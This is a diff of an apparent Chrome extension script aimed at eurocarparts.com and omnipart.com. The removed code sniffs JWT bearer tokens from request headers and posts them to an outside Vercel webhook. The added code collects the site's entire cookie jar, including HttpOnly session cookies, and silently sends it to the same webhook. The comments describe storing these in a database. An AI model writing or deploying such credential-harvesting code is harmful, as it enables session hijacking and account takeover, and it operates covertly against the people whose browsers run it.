@@ -1,28 +1,7 @@
 chrome.webRequest.onSendHeaders.addListener(
     (details) => {
-        if (!details.requestHeaders) return;
-        for (let header of details.requestHeaders) {
-            let hName = header.name.toLowerCase();
-            let hVal = header.value;
-            
-            if (hVal.includes('eyJ') && hVal.length > 50) {
-                let cleanToken = hVal;
-                let match = hVal.match(/(eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+)/);
-                if (match) cleanToken = match[1];
-                else if (hVal.toLowerCase().startsWith('bearer ')) cleanToken = hVal.substring(7);
-
-                fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ token: cleanToken })
-                }).catch(() => {});
-                
-                if (details.tabId >= 0) {
-                    chrome.tabs.sendMessage(details.tabId, { action: "TOKEN_CAUGHT" }).catch(() => {});
-                }
-                break;
-            }
-        }
+        // Disabled active network scan for Omnipart because it was catching the bare JWT
+        // and overwriting the full deep COOKIE_JAR string in the database which is needed.
     },
     { urls: ["*://*.eurocarparts.com/*", "*://*.omnipart.com/*"] },
     ["requestHeaders", "extraHeaders"]
@@ -30,37 +9,32 @@ chrome.webRequest.onSendHeaders.addListener(
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.action === "SCAN_OMNIPART") {
-        // Scan natively stored Chrome cookies (including HttpOnly which cannot be seen via inject scripts)
         chrome.cookies.getAll({ domain: "eurocarparts.com" }, (cookies) => {
             let foundToken = null;
-            let cookieNames = [];
+            let rawCookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");
+            
+            // Still parse out the cleanest token for the alert logic if we can
             for (let c of cookies) {
-                cookieNames.push(c.name);
                 if (c.value.includes('eyJ') && c.value.length > 50) {
                     let match = c.value.match(/(eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+)/);
                     if (match) {
                         foundToken = match[1];
+                        break;
                     }
                 }
             }
 
-            if (foundToken) {
+            if (rawCookieString.length > 20) {
+                // If we found cookies, just beam the entire raw cookie string as the token
                 fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ token: foundToken })
+                    body: JSON.stringify({ token: "COOKIE_JAR:" + rawCookieString })
                 }).catch(() => {});
                 
-                if (sender && sender.tab) {
+                if (foundToken && sender && sender.tab) {
                     chrome.tabs.sendMessage(sender.tab.id, { action: "TOKEN_CAUGHT" }).catch(() => {});
                 }
-            } else {
-                // If it STILL wasn't found, dump the cookie names so we can see what's happening
-                fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ token: "ERROR_NO_TOKEN_FOUND-COOKIES_ARE:" + cookieNames.join(',') })
-                }).catch(() => {});
             }
         });
     }
